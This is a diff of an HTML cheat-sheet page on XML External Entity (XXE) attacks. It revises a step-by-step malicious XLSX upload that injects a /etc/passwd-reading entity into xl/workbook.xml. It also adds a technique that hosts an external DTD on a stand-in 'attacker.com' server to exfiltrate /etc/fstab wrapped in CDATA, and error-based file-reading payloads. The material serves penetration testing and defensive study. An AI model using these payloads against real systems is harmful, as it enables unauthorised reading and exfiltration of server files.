@@ -9,7 +9,7 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,700;1,400&family=Inter:wght@400;500&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
-  <link rel="stylesheet" href="/assets/style.css?v=7707fc7">
+  <link rel="stylesheet" href="/assets/style.css?v=f57364b">
 </head>
 <body class="page-kb-sheet">
   <nav class="topnav">
@@ -1169,20 +1169,22 @@ graph LR
 <p>XLSX files are ZIP archives containing XML files. The attack involves extracting, injecting and repackaging.</p>
 <p><strong>Step 1:</strong> Extract:</p>
 <pre class="highlight"><code class="language-bash">unzip document.xlsx -d xlsx_extracted/</code></pre>
-<p><strong>Step 2:</strong> Inject into the XML files inside the archive. The most common injection points are <code>xl/sharedStrings.xml</code> (shared string table used for cell values), <code>xl/worksheets/sheet1.xml</code> (individual worksheet data) and <code>[Content_Types].xml</code> (content type definitions). Here is an example injecting into the workbook:</p>
-<pre class="highlight"><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
-&lt;!DOCTYPE workbook [
+<p><strong>Step 2:</strong> Inject into the XML files inside the archive. The most reliable injection point is <code>xl/workbook.xml</code> — this is the first file most parsers read to get the list of sheets, making it the most consistently triggered target. Other viable injection points are <code>xl/sharedStrings.xml</code> (shared string table used for cell values) and <code>xl/worksheets/sheet1.xml</code> (individual worksheet data). Here is an example injecting into <code>xl/workbook.xml</code>:</p>
+<pre class="highlight"><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;
+&lt;!DOCTYPE cdl [
+  &lt;!ELEMENT cdl ANY&gt;
   &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
 ]&gt;
-&lt;workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"&gt;
+&lt;cdl&gt;&amp;xxe;&lt;/cdl&gt;
+&lt;workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"
+          xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"&gt;
   &lt;sheets&gt;
     &lt;sheet name="Sheet1" sheetId="1" r:id="rId1"/&gt;
   &lt;/sheets&gt;
-  &lt;text&gt;&amp;xxe;&lt;/text&gt;
 &lt;/workbook&gt;</code></pre>
-<p><strong>Step 3:</strong> Repackage:</p>
+<p><strong>Step 3:</strong> Repackage. Use <code>zip -u</code> to update the existing archive in place rather than creating a new one — some Excel parsing libraries check the ZIP signature and will reject a file that was fully recreated:</p>
 <pre class="highlight"><code class="language-bash">cd xlsx_extracted
-zip -r ../malicious.xlsx *
+zip -u ../malicious.xlsx xl/workbook.xml
 cd ..</code></pre>
 <p><strong>Step 4:</strong> Upload and monitor.</p>
 <h3 id="docx-word-document-file-upload">DOCX (Word Document) File Upload</h3>
@@ -1262,6 +1264,9 @@ cd ..</code></pre>
     &lt;/GetUser&gt;
   &lt;/soap:Body&gt;
 &lt;/soap:Envelope&gt;</code></pre>
+<h4 id="a-note-on-parser-strictness-again">⚠️ A Note on Parser Strictness (again)</h4>
+<p>While the payload above is logically correct, it often fails in modern production environments. This is because the W3C XML Specification forbids the expansion of parameter entities (like %eval;) within the internal DTD subset (the part inside the [...] brackets) if they are used to define other markup.</p>
+<p>Many modern, spec-compliant parsers (like those in Java, .NET, or Libxml2) will throw an error as soon as they see %eval; used this way. If your payload is rejected with a "Parameter entity references are not allowed in internal DTD subsets" error, you will need to use other techniques (like OOB exfiltration) to successfully read the file contents.</p>
 <h3 id="ws-addressing">WS-Addressing</h3>
 <p>Some SOAP services use WS-Addressing headers which provide another injection point:</p>
 <pre class="highlight"><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
@@ -1340,13 +1345,31 @@ Content-Type: application/json
 <p>APIs with poor input validation might accept <code>text/xml</code>, <code>application/xml</code>, <code>application/json</code>, <code>text/plain</code> or even missing content-types with XML content. Try the XXE payload with various content-type headers, with null/missing headers, and with charset parameters (<code>application/xml; charset=utf-8</code>).</p>
 <h2 id="handling-files-with-xml-special-characters">Handling Files with XML-Special Characters</h2>
 <p>When targeting files that contain special XML characters (<code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>) direct entity inclusion fails because those characters break XML parsing. This is a common limitation when trying to read config files, HTML files or source code.</p>
-<p>CDATA sections allow inclusion of raw content without interpretation but entity expansion does not occur within CDATA sections so wrapping the entity in CDATA will not work:</p>
+<p>CDATA sections theoretically allow inclusion of raw content without XML interpretation, but entity expansion does not occur within CDATA sections — so wrapping the entity reference directly in CDATA does not work:</p>
 <pre class="highlight"><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
 &lt;!DOCTYPE foo [
   &lt;!ENTITY xxe SYSTEM "file:///etc/hosts"&gt;
 ]&gt;
 &lt;foo&gt;&lt;![CDATA[&amp;xxe;]]&gt;&lt;/foo&gt;</code></pre>
-<p>The workaround is to use error-based exfiltration or OOB techniques since errors bypass normal XML parsing rules:</p>
+<p>The entity <code>&amp;xxe;</code> inside the CDATA block is treated as literal text, not resolved.</p>
+<h3 id="workaround-1-cdata-via-external-dtd">Workaround 1: CDATA via External DTD</h3>
+<p>The correct way to use CDATA wrapping is to construct it dynamically using parameter entities in an external DTD. Because parameter entity chaining is allowed in external DTDs — unlike in the internal subset — we can build the CDATA wrapper around the file content before it reaches the document body:</p>
+<p>Host this DTD on your attacker-controlled server:</p>
+<pre class="highlight"><code class="language-xml">&lt;!ENTITY % start "&lt;![CDATA["&gt;
+&lt;!ENTITY % file SYSTEM "file:///etc/fstab"&gt;
+&lt;!ENTITY % end "]]&gt;"&gt;
+&lt;!ENTITY % all "&lt;!ENTITY content '%start;%file;%end;'&gt;"&gt;</code></pre>
+<p>Then send this payload to the vulnerable application:</p>
+<pre class="highlight"><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY % dtd SYSTEM "http://attacker.com/cdata.dtd"&gt;
+  %dtd;
+  %all;
+]&gt;
+&lt;foo&gt;&amp;content;&lt;/foo&gt;</code></pre>
+<p>When the parser loads the external DTD, <code>%all</code> defines the general entity <code>&amp;content;</code> whose value is <code>&lt;![CDATA[&lt;file contents&gt;]]&gt;</code>. The CDATA wrapper neutralises the special characters before the parser sees them in the document body. This technique requires the parser to be able to reach your server — the same network condition as OOB exfiltration.</p>
+<h3 id="workaround-2-oob-or-error-based-exfiltration">Workaround 2: OOB or Error-Based Exfiltration</h3>
+<p>When the external DTD approach is not viable, OOB and error-based techniques bypass the special characters problem through a different mechanism. For OOB, the file contents are embedded in a URL query string where special characters get automatically URL-encoded during the HTTP request. For error-based, the content is embedded in a file path where the parser includes it verbatim in the error message regardless of XML validity:</p>
 <pre class="highlight"><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
 &lt;!DOCTYPE foo [
   &lt;!ENTITY % file SYSTEM "file:///path/to/file/with/special/chars.xml"&gt;
@@ -1355,7 +1378,7 @@ Content-Type: application/json
   %error;
 ]&gt;
 &lt;foo&gt;&lt;/foo&gt;</code></pre>
-<p>The error message will contain the file contents including the special characters. When exfiltrating via HTTP GET requests the special characters get automatically URL-encoded in the query string which also helps.</p>
+<p>The error message will contain the file contents including the special characters.</p>
 <hr />
 <h1 id="advanced-techniques">Advanced Techniques</h1>
 <p>These techniques require specific technology stacks, rare configurations or complex payload crafting. They are not the first thing to try but can be critical when standard techniques fail. This section also includes environment-specific escalation paths (like RCE through PHP expect:// or Java deserialization) which depend on very particular conditions in the target.</p>
@@ -1833,6 +1856,6 @@ unzip interactsh-client_1.0.0_linux_amd64.zip
       });
     });
   </script>
-  <script src="/assets/main.js?v=7707fc7" defer></script>
+  <script src="/assets/main.js?v=f57364b" defer></script>
 </body>
 </html>
